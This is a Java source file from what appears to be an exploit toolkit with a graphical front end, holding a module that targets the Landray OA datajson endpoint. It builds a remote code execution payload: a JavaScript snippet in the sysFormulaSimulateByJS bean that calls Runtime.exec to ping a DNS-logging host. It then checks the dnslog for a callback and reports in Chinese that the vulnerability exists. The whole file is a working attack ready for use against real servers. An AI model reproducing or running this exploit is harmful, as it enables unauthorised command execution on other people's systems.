package Exp.OA.landrayoa;

import Utilss.HttpTools;
import Utilss.Response;
import Utilss.shell;
import core.Exploitlnterface;
import javafx.scene.control.TextArea;

import java.util.HashMap;

public class landray_datajson implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea) {
        Boolean att = att(url, textArea);
        return att;
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        textArea.appendText("\n 该漏洞已直接执行系统命令，无需getshell");
        return false;
    }

    private Boolean att(String url,TextArea textArea){
        String dnspath = shell.readFile(shell.dnspath).replace("http://","");
        String replace = dnspath.replace("/", "");
        String payload = "?s_bean=sysFormulaSimulateByJS&script=function%20test(){%20return%20java.lang.Runtime};r=test();r.getRuntime().exec(\"ping%20" + replace + "\")&type=1";
        Response dns_le1 = HttpTools.get(shell.readFile(shell.dnscofpath), new HashMap<String, String>(), "utf-8");
        int dns_1 = dns_le1.getText().length();

        Response response = HttpTools.get(url + payload, new HashMap<String, String>(), "utf-8");

        try { Thread.sleep (5000) ;
        } catch (Exception ie){}

        Response dns_le2 = HttpTools.get(shell.readFile(shell.dnscofpath), new HashMap<String, String>(), "utf-8");
        int dns_2 = dns_le2.getText().length();

        if(dns_2 > dns_1){
            textArea.appendText("\n漏洞存在-收到dnslog回显  \n " + url + payload + "\n");
            return true;
        }else {
            textArea.appendText("\nlandray_datajson-RCE-漏洞不存在 (出现误报请联系作者)");
            return false;
        }
    }
}
